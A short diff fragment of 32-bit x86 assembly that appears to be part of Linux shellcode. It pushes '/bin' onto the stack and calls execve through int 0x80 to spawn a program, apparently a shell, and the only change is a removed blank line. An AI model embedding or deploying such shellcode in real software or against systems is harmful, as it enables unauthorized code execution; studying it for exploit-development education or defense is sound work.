@@ -104,4 +104,3 @@ push 0x6e69622f;/bin
 mov ebx, esp
 mov al, 0xb ;; execve(const char *filename, char *const argv[],char *const envp[]);
 int 0x80
-
